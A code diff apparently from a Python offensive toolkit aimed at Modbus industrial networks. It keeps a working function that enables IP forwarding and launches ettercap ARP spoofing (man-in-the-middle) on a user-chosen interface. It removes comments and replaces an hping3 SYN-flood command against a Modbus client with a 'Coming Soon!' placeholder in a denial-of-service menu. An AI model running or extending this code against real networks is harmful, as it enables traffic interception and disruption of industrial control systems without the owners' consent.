@@ -62,11 +62,9 @@ def etterspoof():
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     print("Checking ettercap...")
     
-    # 1. Check if it's already running
     if subprocess.getoutput("pgrep -x ettercap") == "":
         intrfce = input("Enter Interface Name (e.g., eth1): ") 
         
-        # 2. Define the command (Using list format for Popen is safer)
         cmd = [
             "ettercap", "-TqD", "-i", intrfce, 
             "-M", "arp:remote", 
@@ -75,7 +73,6 @@ def etterspoof():
         
         print(f"Executing: {' '.join(cmd)}")
         
-        # 3. Launch the process
         subprocess.Popen(
             cmd, 
             stdout=subprocess.DEVNULL, 
@@ -84,16 +81,13 @@ def etterspoof():
             start_new_session=True
         )
         
-        # --- THE FIX GOES HERE ---
         print("Waiting for Ettercap to initialize...")
         time.sleep(3)  # Give it 3 seconds to scan hosts and drop privileges
         
-        # 4. Final Verification
         if subprocess.getoutput("pgrep -x ettercap") != "":
             print("Successfully enabled ARP Spoofing.")
         else:
             print("Failed to enable Ettercap. Check /etc/ettercap/etter.conf UID settings.")
-        # -------------------------
 
     else:
         print("Ettercap is already active!")
@@ -125,7 +119,7 @@ def dos():
         print("1) SYN Flood\n2) Modbus Firewall\nq) Return")
         select = input(">> ")
         if select == "1":
-            hping3 -i u40 -S -p nm_config.mod_port -c 100000 nm_config.modcli_ip
+            print("Coming Soon!")
             time.sleep(1)
             dos()
         elif select == "2":
